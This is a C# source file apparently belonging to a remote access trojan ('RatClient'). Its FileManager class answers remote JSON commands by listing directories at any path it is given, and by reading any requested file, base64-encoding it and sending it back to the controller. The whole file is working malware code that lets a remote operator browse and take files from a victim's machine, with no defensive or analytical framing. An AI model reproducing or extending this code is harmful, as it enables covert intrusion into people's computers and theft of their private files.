using System;
using System.Collections.Generic;
using System.Web.Script.Serialization;
using System.IO;

namespace RatClient.Features
{
    public class FileManager
    {
        #region Variables
        private Action<object> SendJson;
        #endregion

        #region Constructor
        public FileManager(Action<object> SendJson)
        {
            this.SendJson = SendJson;

            Program.MessageReceived += HandleMessage;
        }
        #endregion

        #region Methods
        private void HandleMessage(dynamic jsonMessage)
        {
            if (jsonMessage["type"] == "fm_list")
            {
                string filesAndFolders = GetFilesAndFolders(jsonMessage["path"]);
                if (!string.IsNullOrEmpty(filesAndFolders))
                {
                    SendJson(new { type = "fm_list", filesAndFolders });
                }
            }
            else if (jsonMessage["type"] == "fm_download")
            {
                string filePath = jsonMessage["path"];

                if (File.Exists(filePath))
                {
                    string data = Convert.ToBase64String(File.ReadAllBytes(filePath));
                    SendJson(new { type = "fm_upload", name = Path.GetFileName(filePath), data });
                }
            }
        }

        public string GetFilesAndFolders(string path)
        {
            Dictionary<string, object> items = new Dictionary<string, object>();
            if (!Directory.Exists(path))
            {
                return "";
            }

            foreach (var directory in Directory.GetDirectories(path, "*", SearchOption.TopDirectoryOnly))
            {
                DirectoryInfo dirInfo = new DirectoryInfo(directory);
                items[dirInfo.Name] = new { Type = "DIRECTORY", Size = "N/A" };
            }
            foreach (var file in Directory.GetFiles(path, "*", SearchOption.TopDirectoryOnly))
            {
                FileInfo fileInfo = new FileInfo(file);
                items[fileInfo.Name] = new { Type = "FILE", Size = fileInfo.Length.ToString() };
            }

            return new JavaScriptSerializer().Serialize(items);
        }
        #endregion
    }
}